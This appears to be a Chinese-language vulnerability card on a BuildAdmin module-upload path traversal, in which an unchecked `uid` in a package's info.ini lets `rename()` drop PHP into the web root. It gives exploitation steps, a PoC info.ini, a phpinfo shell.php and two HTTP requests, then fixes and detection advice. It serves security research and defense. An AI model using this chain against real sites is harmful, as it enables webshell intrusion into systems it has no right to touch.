---
id: web-generic-file-upload-buildadmin-module-ini-uid-traversal
title: BuildAdmin 模块市场安装包 info.ini 的 uid 路径穿越：解压目录可控导致任意目录写 PHP getshell
type: scenario
domain: web
path: web/generic/file-upload
technique: module-ini-uid-path-traversal
aliases:
- 模块市场 getshell
- info.ini uid 目录穿越
- BuildAdmin 模块上传
- 模块安装任意文件写
- uid 拼接 rename 穿越
tags:
- php
- buildadmin
- file-upload
- path-traversal
- module-install
- webshell
- web
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V514
  verified_at: '2026-11-11T11:47:48+08:00'
  notes: 已对照原文与全部21张截图：Seay 定位 upload()、Module.php 与 Manage.php 源码、getIni/parse_ini_file、断点显示 uid=/../public/test 时 modulesDir 为 modules\../public/test（等价 public/test）、public/test 落 info.ini 与 shell.php、访问 /test/shell.php 返回 phpinfo，均与卡片一致。修正一处：uid 开头写 / 只是形成 modules//...，不能当绝对路径，穿越要靠 ../，已改写变体描述。原文只写最新发行版，v2.0.5 仅出现在本地目录名，按任务不设 affected_versions。dedup 自匹配非重复；与 Zip Slip/CMS addon 卡不同链。另：staging 的旧草稿 ...-info-ini-uid-traversal-rce.md 在核对期间已被批次流程移入 ingest/rejected/drafts/（时间戳 20261111-113646），文件未丢失；非本验证员删除。
---

## 一句话结论

后台模块/插件市场安装上传的 zip 时，从包内 `info.ini` 读取 `uid` 并无校验地拼进模块安装目录（`modulesDir = installDir . uid . '/'`），随后 `rename()` 把解压出的整个目录移动到该路径；把 `uid` 写成 `/../public/test` 之类的穿越值，就能让包内 PHP 文件落到 Web 可解析目录，直接 getshell。

## 原理

- **模块安装流程**：后台「模块市场 → 上传安装」对应控制器 `Module::upload()`，它接收 `file`（指向 `public` 下已上传 zip 的相对路径）与 `token`（BuildAdmin 官网账户 token），调用 `Manage::upload($token, $file)`：`fsFit(root_path().'public'.$file)` 定位 zip → `copy` 到 `installDir/uploadTemp<YmdHis>.zip` → `Filesystem::unzip` 解压 → `Server::getIni($copyToDir)` 读取包内 `info.ini`。
- **uid 完全由攻击者控制**：`info.ini` 是压缩包内的攻击者可控元数据，`getIni` 用 `parse_ini_file` 解析后，`uid` 未做 `basename()`、白名单或任何字符过滤，直接拼接：`$this->modulesDir = $this->installDir . $info['uid'] . DIRECTORY_SEPARATOR;`。
- **为什么能穿越**：`installDir` 是 `modules/`，当 `uid=/../public/test` 时拼接结果为 `modules//../public/test`，文件系统按路径语义解析后等价于 `public/test`（Web 根下的目录）。
- **rename 完成落盘**：`rename($copyToDir, $this->modulesDir)` 对目录相当于移动；只要目标父目录存在，整个解压目录（含 `shell.php`）被搬进 Web 目录，PHP 被 Web 服务器直接解析。
- **危险面**：模块/插件/主题安装天然要解压外部归档并信任包内元数据（目录名、版本号等），凡是从压缩包读取的字段被拼进文件系统路径，就有同类穿越风险。
- **权限前提**：`Module` 控制器在后台，需管理员会话；`token` 参数是 BuildAdmin 官网账户 token（`ba-user-token` 传给 `Server::installPreCheck` 调官方服务器做安装预检），本机调试时前端读不到 Batoken 会报错，抓包带上即可。

## 触发条件

- 后台模块市场开放「上传安装」功能，攻击者持有后台会话（或模块管理权限）。
- 上传包内 `info.ini` 字段齐全（`uid`、`title`、`intro`、`author`、`version`、`state`）以通过 `checkPackage`，且 `uid` 未校验。
- 安装目录路径未做规范化与边界校验，`rename` 目标可包含 `../` 穿越段。
- Web 服务器对目标目录（如 `public/` 下子目录）的 `.php` 正常解析。

## 利用步骤

1. 定位模块上传安装接口（如 `POST /admin/module/upload`，`file` 为 query 参数指向 `public` 下 zip 相对路径，`token` 为官网账户 token）。
2. 制作恶意 zip：`info.ini`（`uid=/../public/test`，其余必填字段随意填充）+ `shell.php`（`<?php phpinfo(); ?>`）。
3. 先用后台普通上传接口（如 `POST /admin/ajax/upload`）把 zip 传到 `/storage/default/<日期>/` 下，拿到相对路径（响应中的 `full_url`/`url`）。
4. 调用模块上传安装接口，`file` 指向该 zip：后端解压、读取 `uid`、`rename` 穿越到 `public/test`。
5. 访问 `/test/shell.php` 确认代码执行，getshell。
6. 若目标目录已存在且非空会被「目录被占」拦截；换一个不存在或为空的穿越目标目录，或利用升级分支（`upgrade` 时先 `delDir`）重试。

## PoC

恶意包内的 `info.ini`：

```ini
uid=/../public/test
title=hack
intro=test
author=mscb
version=1
state=test
```

包结构：

```text
evil.zip
├── info.ini
└── shell.php    # <?php phpinfo(); ?>
```

先上传 zip，再调用模块安装：

```http
POST /admin/ajax/upload HTTP/1.1
Host: target
Batoken: <后台会话 token>
Content-Type: multipart/form-data; boundary=...

<file=evil.zip>
```

```http
POST /admin/module/upload?file=/storage/default/20240227/evil.zip&token=<BuildAdmin 官网 token> HTTP/1.1
Host: target
Batoken: <后台会话 token>
```

成功后 `public/test/` 下出现 `info.ini` 与 `shell.php`，访问 `http://target/test/shell.php` 执行。

## 变体与关联

- 变体：`uid` 是直接拼接在 `installDir` 之后的路径片段，开头写 `/` 只会形成 `modules//...`（仍相对 `modules/`，等价于绝对路径的直觉不成立），真正穿越要靠足够多的 `../` 指向任意可写目录（`public`、`uploads`、`static` 等任何可解析目录）；目标目录为空时可直接写入。
- 变体：同类风险存在于主题安装、插件安装、备份恢复等「解压外部归档并按包内元数据命名」的功能；审计时搜 `parse_ini_file`/`getIni` 之后字段是否进入路径拼接或 `rename`/解压目标。
- 关联：[[web-generic-file-upload-jeewms-cgformtemplate-zipslip-templatecode]]（解压目标目录由参数控制导致穿越，机制同类、入口不同）、[[web-generic-file-upload-zip-slip-webshell-write]]（条目名 `../` 穿越的通用 Zip Slip）、[[web-generic-file-upload-cms-addon-info-php-zip-installer-rce]]（模块安装包 info 文件校验绕过的另一形态）。
- 边界：`uid` 做了白名单/`basename`/`realpath` 边界校验，或 `public` 下禁止 PHP 解析时不成立。

## 检测与防御

- 修复：对 `uid` 做严格白名单（如 `[A-Za-z0-9_-]{1,64}`），拼接后用 `realpath()` 校验结果必须位于 `installDir` 内，否则拒绝。
- 修复：解压目标使用服务端生成的随机/临时目录，校验完成后再移动；禁止把包内元数据直接作为文件系统路径。
- 加固：模块包签名与来源校验；安装接口仅管理员可用并加二次确认；`public` 上传目录禁止脚本执行。
- 检测：模块安装请求的 `info.ini` 含 `../` 或绝对路径；`rename` 目标路径超出 `modules/`；Web 目录出现非预期 `.php` 文件与安装时间吻合。
